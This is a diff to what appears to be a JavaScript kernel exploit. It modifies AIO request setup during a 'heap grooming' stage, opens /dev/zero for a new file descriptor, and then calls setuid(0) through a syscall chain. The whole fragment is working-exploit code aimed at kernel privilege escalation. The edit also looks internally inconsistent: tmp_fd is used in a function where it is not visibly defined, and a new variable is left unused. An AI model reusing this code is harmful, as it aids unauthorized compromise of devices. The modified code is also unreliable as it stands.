@@ -1622,10 +1622,12 @@ function setup(block_fd) {
     const block_id = new Word();
 
     for (let i = 0; i < num_workers; i++) {
-        reqs1.write32(8 + i*0x28, 1);
-        reqs1.write32(0x20 + i*0x28, block_fd);
+           reqs1.write32(0x20 + i*0x28, tmp_fd);
+
     }
-    aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
+     const id = new Word();
+     
+   aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
@@ -1696,6 +1698,10 @@ export async function kexploit() {
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
+
+    const tmp_fd = sysi('open', '/dev/zero', 0, 0);
+  if (tmp_fd < 0) die('non posso aprire /dev/zero');
+
 
      try {
         chain.sys('setuid', 0);
